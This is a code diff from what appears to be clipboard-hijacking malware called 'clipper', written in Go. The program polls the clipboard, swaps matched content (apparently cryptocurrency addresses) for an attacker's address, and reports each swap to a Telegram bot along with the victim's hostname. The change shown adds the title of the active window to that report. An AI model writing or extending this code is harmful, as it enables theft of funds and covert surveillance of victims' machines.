@@ -7,7 +7,9 @@ import (
 	"time"
 
 	"github.com/atotto/clipboard"
+
 	"clipper/src/telegram"
+	"clipper/src/utils"
 )
 
 type Matcher struct {
@@ -22,7 +24,7 @@ func StartClipper(chat_id string, bot_token string, matchers []Matcher) {
 		hostname, _ := os.Hostname()
 
 		for {
-			time.Sleep(600 * time.Millisecond)
+			time.Sleep(600 * time.Millisecond) // (1000 = 1s)
 
 			currentContent, err := clipboard.ReadAll()
 			if err != nil {
@@ -48,7 +50,8 @@ func StartClipper(chat_id string, bot_token string, matchers []Matcher) {
 
 					telegram.SendLog(
 						fmt.Sprintf(
-							"%s\n\n%s → %s",
+							"%s | %s\n\n%s → %s",
+							utils.GetActiveWindow(),
 							hostname,
 							originalAddr,
 							matcher.Addr,
